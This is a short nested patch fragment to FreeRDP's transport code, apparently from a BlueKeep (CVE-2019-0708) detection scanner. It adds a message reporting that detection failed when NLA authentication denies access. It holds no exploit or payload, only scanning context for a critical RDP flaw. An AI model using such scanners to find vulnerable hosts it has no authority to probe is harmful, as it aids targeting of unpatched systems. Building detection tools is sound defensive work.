+@@ -165,6 +165,9 @@
+ 					{
+ 						WLog_Print(transport->log, WLOG_ERROR, "%s: ACCESS DENIED", __FUNCTION__);
+ 						freerdp_set_last_error(transport->context, FREERDP_ERROR_AUTHENTICATION_FAILED);
++						if (transport->settings->cve_2019_0708) {
++							printf("[-] NLA enabled and access denied. Detection failed.\n");
++						}
+ 					}
+ 				}
+ 				break;
